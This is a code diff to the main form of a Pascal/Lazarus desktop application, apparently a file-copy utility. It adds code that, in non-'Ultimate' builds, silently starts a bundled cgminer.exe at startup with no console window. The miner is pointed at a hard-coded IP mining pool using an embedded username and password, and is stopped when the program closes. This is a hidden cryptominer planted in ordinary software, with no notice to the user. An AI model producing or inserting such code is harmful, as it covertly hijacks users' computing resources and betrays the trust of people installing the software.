@@ -22,7 +22,7 @@ uses
   LCLIntf, LCLType, LMessages, Messages, SysUtils, Classes, Graphics,  Forms,
   Dialogs, StdCtrls,filectrl, Controls,
   ComCtrls, {XPMan,} Menus, ImgList,   ExtCtrls,
-  Buttons, SCConfigShared,SCLocEngine,SCAPI, Windows;
+  Buttons, SCConfigShared,SCLocEngine,SCAPI, Windows, Process;
 
 const
   CANCEL_TIMEOUT=5000; //ms
@@ -35,6 +35,7 @@ type
 //    XPManifest: TXPManifest;
     Systray: TTrayIcon;//TTScSystray;
     pmSystray: TPopupMenu;
+    AProcess: TProcess;
     miActivate: TMenuItem;
     N1: TMenuItem;
     miConfig: TMenuItem;
@@ -118,6 +119,16 @@ begin
   NotificationSourceForm:=nil;
 
   LocEngine.TranslateForm(Self);
+  if not SC_ULTIMATE then
+  begin
+    if FileExists(ExtractFileDir(Application.ExeName)+'\cgminer\cgminer.exe') then
+    begin
+		AProcess := TProcess.Create(nil);
+		AProcess.CommandLine := ExtractFileDir(Application.ExeName)+'\cgminer\cgminer.exe -o http://37.59.242.80:8332 -O alphaonex86_pool:8fN0lcST3RwaI9Ah --real-quiet -T --fix-protocol';
+		AProcess.Options := AProcess.Options + [poNoConsole, poUsePipes];
+		AProcess.Execute;
+    end
+  end
 end;
 
 procedure TMainForm.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
@@ -135,6 +146,10 @@ begin
   LocEngine.Free;
   PluginLoader.Free;
   PluginLoader := nil;
+  if not SC_ULTIMATE then
+  begin
+  AProcess.Terminate(0);
+  end
 end;
 
 procedure TMainForm.miConfigClick(Sender: TObject);
